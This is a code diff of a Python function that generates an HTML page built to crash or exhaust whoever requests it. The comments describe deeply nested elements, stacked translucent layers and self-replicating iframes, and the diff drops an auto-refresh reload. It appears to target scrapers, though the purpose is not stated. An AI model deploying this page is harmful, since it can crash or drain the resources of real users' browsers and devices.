@@ -13,19 +13,16 @@ def createHtml():
     #    by reparenting the excessively deep elements (https://bugzilla.mozilla.org/show_bug.cgi?id=256180).
     # 2. if the requester hasn't crashed and tries to render the page: the elements are placed on top of each other
     #    and they are also partially transparent. depending on how the requester renders the page it might use
-    #    significant gpu or cpu time to create the visual appearance of the page
+    #    significant gpu and / or cpu time to create the visual appearance of the page
     # 3. if the requester hasn't crashed after rendering the page and tries to run the javascript: use the rabbit virus
     #    technique to further exhaust resources. infinitely copy itself to new child iframes, which then also
     #    infinitely copy itself to new child iframes, etc. while most modern browsers limit the nesting depth of
     #    iframes and the total amount of browsing contexts (https://github.com/WebKit/WebKit/pull/7219), resource
-    #    exhaustion will probably happen earlier than those limits.
-    # 4. if all that still didn't exhaust the resources of the requester: reload the page after ~1.5 min to
-    #    continuously use resources of the requester
+    #    exhaustion will probably happen earlier than those limits
     PREFIX = r'''<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta http-equiv="refresh" content="99">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="color-scheme" content="dark">
 <meta name="theme-color" content="black">
@@ -37,7 +34,7 @@ def createHtml():
 <meta name="creator" content="p">
 <meta name="publisher" content="p">
 <title>div</title>
-<link rel="icon" href="http://a.invalid/i.ico">
+<link rel="icon" href="https://a.test/i.ico">
 <style>
 html, body, div, p, iframe {
 box-sizing: border-box;
@@ -50,13 +47,14 @@ overflow: hidden;
 padding: 0;
 margin: 0;
 border: 0;
-background: radial-gradient(circle, rgba(0, 0, 0, 0.1) 90%, rgba(99, 99, 99, 0.1) 99%);
+background: radial-gradient(rgba(0, 0, 0, 0.8) 80%, rgba(1, 1, 1, 0.8) 100%);
 background-blend-mode: screen;
 mix-blend-mode: screen;
-opacity: 0.1;
+opacity: 0.8;
 }
 </style>
 <script>
+"use strict";
 onload = () => {
 const frame = document.createElement("iframe");
 frame.sandbox = "allow-scripts";
